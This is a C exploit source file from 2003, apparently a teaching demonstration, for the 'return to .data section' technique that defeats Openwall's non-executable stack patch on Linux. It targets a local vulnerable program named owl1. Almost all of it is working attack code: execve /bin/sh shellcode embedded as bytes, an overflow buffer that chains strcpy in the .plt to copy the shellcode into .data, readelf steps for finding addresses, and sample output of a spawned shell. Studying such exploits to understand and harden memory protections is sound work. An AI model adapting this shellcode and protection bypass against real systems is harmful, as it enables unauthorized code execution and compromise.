/*
 * $Id: owl1-ex.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * owl1-ex.c - owl1.c exploit (return to .data section)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit demonstrates the return to .data section technique, used to
 * bypass the stack protection provided by the openwall kernel patches on
 * Linux. See http://www.openwall.com/linux/ for more details about the
 * Linux kernel patches from Openwall project.
 *
 * $ ./owl1-ex 
 * Using ret: 0xbfffffdc
 * smash me!
 * sh-2.05$
 *
 * Grab the addresses you need:
 *
 * $ readelf -a owl1 | grep strcpy
 *  080494f8  00707 R_386_JUMP_SLOT       08048338  strcpy                   
 *     7: 08048338    32 FUNC    GLOBAL DEFAULT  UND strcpy@GLIBC_2.0 (2)
 *    78: 08048338    32 FUNC    GLOBAL DEFAULT  UND strcpy@@GLIBC_2.0
 *        ^^^^^^^^\__(strcpy() address in .plt)
 *
 * $ readelf -a owl1 | grep "\.data" | grep PROGBITS
 *  [15] .data             PROGBITS        080494bc 0004bc 00000c 00
 *                                         ^^^^^^^^\__(.data section address)
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF	277		// (64 * 4) + 4 + (4 * 4) + 1
#define STRCPY	0x08048338	// strcpy() address in .plt
#define DATA	0x080494bc	// .data section address

char sc[] = /* linux/x86 shellcode (24 bytes) */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main()
{
	char *env[2] = {sc, NULL};
	char buf[BUF];
	int i;

	int *p = (int *)buf;

        int ret = 0xbffffffa - strlen(sc) - strlen("./owl1");

	fprintf(stderr, "Using ret: %p\n", ret);

	/* fill the buffer with dummy stuff */
	for (i = 0; i < 256 + 4; i += 4)
		*p++ = ret;

	/* prepare the stack */
	*p++ = STRCPY;	/* call strcpy() in .plt */
	*p++ = DATA;	/* return address for strcpy() */
	*p++ = DATA;	/* first arg */
	*p++ = ret;	/* second arg */
	*p = 0x0;

	/* run the vulnerable program */
	execle("./owl1", "owl1", buf, NULL, env);
	perror("execle");
}
